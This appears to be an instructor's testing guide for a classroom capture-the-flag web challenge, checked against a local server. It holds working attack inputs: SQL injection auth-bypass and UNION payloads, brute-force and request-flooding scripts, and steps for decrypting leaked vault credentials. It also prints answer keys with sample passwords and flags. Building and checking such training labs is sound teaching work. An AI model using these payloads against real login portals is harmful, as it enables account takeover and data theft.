# Vaultline Heist — Testing Guide

How to verify the whole challenge works before the event. Every command below
was run against this build and behaves as shown.

**Legend:** ✅ = must pass. Run from the project root
(`C:\Users\ANSON\Desktop\Projects\hack-me\hack-me`). Shell blocks are Git-Bash /
Linux style; on PowerShell use `curl.exe` (not `curl`) or the Python snippets.

---

## 0. What you're verifying

| # | Area | Pass criteria |
|---|------|---------------|
| 1 | Automated tests | `manage.py test` → **50 passing** |
| 2 | Break-in: brute-force | correct pw → `success:true` (200), wrong → 401 |
| 3 | Break-in: SQL injection | `victim' --` → `success:true` (200) |
| 4 | Data export leak | JSON includes `account_key`/`account_blob` + `vault_key`/`vault_blob` |
| 5 | AES-256 decrypt | recovers `vault_id` + `vault_password` |
| 6 | Vault gate | opening before rotation → **403** |
| 7 | Rotate → open → loot | flag appears in `vault_records.txt` |
| 8 | Flag binding | a student can't submit another student's flag |
| 9 | Scoreboard | solves appear, ranked, auto-updating |
| 10 | Throttle | `/portal/login/` limits a flooding IP |

---

## 1. Setup

```bash
pip install -r requirements.txt
python manage.py migrate
python manage.py provision_challenge --count 5 --assign
python manage.py runserver 127.0.0.1:8000
```

> For the real event, add `--wordlist /path/to/rockyou.txt` so every target
> password is guaranteed to be in the list students brute-force with.

Leave the server running in one terminal; run the tests below from another.

---

## 2. Automated tests (fastest full check) ✅

```bash
python manage.py test
```

Expected: `Ran 50 tests ... OK`. This alone exercises brute-force, SQLi
auth-bypass, the "no data reflected" guard, the vault gate, AES decrypt, the
full chain scoring 1000, flag binding, and registration auto-assign.

---

## 3. Reveal target answers (INSTRUCTOR ONLY — don't show students)

To test as an attacker you need target usernames (and, for the brute-force
path, the passwords). Dump them:

```bash
python manage.py shell -c "from apps.challenge.models import VaultClient; [print(v.username, '|', v.password, '|', v.vault_id, v.vault_password, '|', v.flag) for v in VaultClient.objects.all()]"
```

Example output:

```
h.vaughn | monkey123 | VLT-6643 zephyr-3229 | HM{284af6bc1429a1e3}
j.reynolds | cheese123 | VLT-4234 zephyr-5782 | HM{1c75505b4a61e2be}
```

Pick one target's `<username>` for the tests below.

---

## 4. Break-in tests (the attack surface)

### 4a. Brute-force ✅

```bash
# correct password -> success:true, HTTP 200
curl -s -X POST http://127.0.0.1:8000/portal/login/ \
  -H "Content-Type: application/json" \
  -d '{"username":"j.reynolds","password":"cheese123"}'

# wrong password -> success:false, HTTP 401
curl -s -X POST http://127.0.0.1:8000/portal/login/ \
  -H "Content-Type: application/json" \
  -d '{"username":"j.reynolds","password":"wrong"}'
```

A realistic mini brute-force (the shape of a student's script):

```python
import requests
URL, USER = "http://127.0.0.1:8000/portal/login/", "j.reynolds"
for pw in ["password", "123456", "cheese123", "qwerty"]:
    r = requests.post(URL, json={"username": USER, "password": pw})
    print(pw, r.status_code, r.json()["success"])
    if r.json()["success"]:
        print("FOUND:", pw); break
```

### 4b. SQL injection auth-bypass ✅

```bash
# username = victim' --   (comments out the password check) -> success:true, 200
curl -s -X POST http://127.0.0.1:8000/portal/login/ \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"j.reynolds' --\",\"password\":\"anything\"}"
```

Also confirm **no data leaks** (auth-bypass only): a UNION payload must never
return a flag in the body.

```bash
curl -s -X POST http://127.0.0.1:8000/portal/login/ \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"x' UNION SELECT flag FROM challenge_vaultclient --\",\"password\":\"y\"}"
# -> success:false; no HM{...} in the response
```

---

## 5. Full chain — automated solver ✅

`tools/solve.py` walks the entire attacker chain over HTTP (uses the SQLi path,
so it only needs the username):

```bash
python tools/solve.py http://127.0.0.1:8000 j.reynolds
```

Expected:

```
[1] SQLi auth-bypass login  -> OK (session established)
[2] Data export leak        -> OK ['display_name', 'account_key', 'account_blob', 'vault_key', 'vault_blob', '_note']
[3] AES-256 decrypt          -> OK account: {'username': 'j.reynolds', 'password': 'cheese123'} | vault: {'vault_id': 'VLT-4234', 'vault_password': 'zephyr-5782'}
[4] Vault gated before rotate-> OK (403)
[5] Rotate password          -> OK
[6] Open vault               -> OK
[7] Loot flag                -> HM{1c75505b4a61e2be}
```

The printed flag must match that target's flag from §3.

---

## 6. Full chain — manual browser walkthrough (the student experience) ✅

Do this once as a "player" to confirm the human flow and the UI.

1. **Register** at `http://127.0.0.1:8000/register/` → you land on the
   **mission page** (`/dashboard/`). It shows **your assigned target username**,
   the starter script, and hints.
2. **Attack the portal** at `/portal/login/`. Either:
   - **SQLi:** username `= <target>' --`, password `= anything` → you're in; or
   - **Brute-force:** run the starter script from the mission page (needs a
     wordlist that contains the password).
3. You land on the **victim overview** (`/portal/`) — the **Open Vault** panel
   shows **🔒 Locked**.
4. Go to **Profile** → **Data** → **Download my data** → saves
   `vaultline_data_export.json`.
5. **Decrypt** the vault credentials:

   ```bash
   # Two AES-256 blobs (encode-decode.com scheme: key=secret zero-padded to 32B, IV=0).
   python tools/decrypt_vault.py vaultline_data_export.json
   # -> account: {"username","password"} ; vault: {"vault_id","vault_password"}
   # Website: encode-decode.com "aes256" — paste a blob as text, its key as secret.
   # Or open tools/vaultline_decrypt.html and paste the whole export.
   ```

6. **Rotate** your password (Profile → *Change password*, or the vault's
   *Rotate password to unlock* button). The vault now shows **Unlocked**.
7. Go to **Vault** → enter the decrypted **Vault ID** + **Vault password** →
   **Open vault** → **Download** `vault_records.txt` → the file contains
   `FLAG: HM{...}`.
8. Back on the **mission page** (`/dashboard/`), paste the flag into **Submit
   flag** → you see "🎉 Flag accepted" and jump to **1000 pts / 5 stages**.

| Step | Expected |
|------|----------|
| 1 | Mission page shows a target username |
| 2 | Login succeeds (redirect to `/portal/`) |
| 3 | Vault panel = 🔒 Locked |
| 4 | JSON downloads with `account_key`/`account_blob` + `vault_key`/`vault_blob` |
| 5 | Decrypt prints vault id + password |
| 6 | Vault panel flips to Unlocked |
| 7 | `vault_records.txt` contains the flag |
| 8 | Scoreboard shows you solved, 1000 pts |

---

## 7. Negative / gate tests ✅

- **Vault before rotation → 403.** Covered by `tools/solve.py` step [4] and the
  `ChainTests.test_vault_gated_until_rotation` unit test.
- **Wrong vault creds → 401.** In the browser, open the vault (after rotating)
  with a bad Vault ID → "Incorrect vault id or vault password."
- **Flag binding.** Log in as student A, submit student B's flag on the mission
  page → rejected ("not correct for your target"); A stays unsolved. (Unit test:
  `FlagBindingTests`.)

---

## 8. Scoreboard ✅

Open `http://127.0.0.1:8000/scoreboard/` on a projector. It polls every ~4s.
Run `tools/solve.py` against a couple of assigned targets and watch rows climb.
JSON feed for a quick check:

```bash
curl -s http://127.0.0.1:8000/scoreboard/data/
```

Each row: `rank`, `handle`, `points`, `stages_done/total_stages`, `solved`.

---

## 9. Throttle (protects the shared box) — optional

`/portal/login/` allows **1200 requests/min per IP** by default. To observe the
limit, burst past it:

```python
import requests
URL = "http://127.0.0.1:8000/portal/login/"
codes = [requests.post(URL, json={"username": "x", "password": "y"}).status_code
         for _ in range(1300)]
print("429s:", codes.count(429))   # > 0 once the minute's budget is spent
```

Tune the ceiling in `apps/challenge/services.py` (`rate_ok`, `limit=`). For a
class > ~15 on multiple workers, point Django's cache at Redis so the counter is
shared.

---

## 10. Reset between runs

```bash
# Remove only unassigned targets (safe top-up before an event):
python manage.py provision_challenge --fresh --count 0

# Reset ONE student's progress (keep the target, clear milestones):
python manage.py shell -c "from apps.challenge.models import VaultClient; \
v=VaultClient.objects.get(username='j.reynolds'); \
v.password_rotated=False; v.cracked_login_at=v.downloaded_data_at=v.rotated_password_at=v.opened_vault_at=v.captured_flag_at=None; \
v.save(); print('reset', v.username)"

# Nuke everything and re-provision:
python manage.py shell -c "from apps.challenge.models import VaultClient; VaultClient.objects.all().delete()"
python manage.py provision_challenge --count 30 --wordlist /path/to/rockyou.txt --assign
```

---

## 11. Go / no-go checklist

- [ ] `python manage.py test` → 50 passing
- [ ] Brute-force: correct pw 200 / wrong pw 401
- [ ] SQLi `victim' --` → 200 success; UNION leaks no flag
- [ ] `tools/solve.py` prints the matching flag
- [ ] Manual browser walkthrough completes and scores 1000
- [ ] Vault open before rotation → 403
- [ ] Another student's flag is rejected
- [ ] Scoreboard updates live
- [ ] Targets provisioned with the **real rockyou** you'll give students
